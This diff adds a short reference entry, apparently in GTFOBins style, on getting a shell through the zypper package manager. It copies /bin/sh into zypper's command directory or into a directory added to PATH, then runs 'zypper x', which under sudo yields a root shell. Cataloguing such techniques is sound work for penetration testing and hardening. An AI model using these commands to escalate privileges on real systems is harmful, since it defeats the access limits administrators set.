@@ -1,0 +1,23 @@
+zypper
+======
+
+Shell
+-----
+
+[Sudo]
+    cp /bin/sh /usr/lib/zypper/commands/zypper-x
+zypper x
+    The copy usually requires elevated privileges.
+
+[Unprivileged]
+    cp /bin/sh /usr/lib/zypper/commands/zypper-x
+zypper x
+    The copy usually requires elevated privileges.
+
+[Sudo]
+    cp /bin/sh /path/to/temp-dir/zypper-x
+PATH=$PATH:/path/to/temp-dir/ zypper x
+
+[Unprivileged]
+    cp /bin/sh /path/to/temp-dir/zypper-x
+PATH=$PATH:/path/to/temp-dir/ zypper x
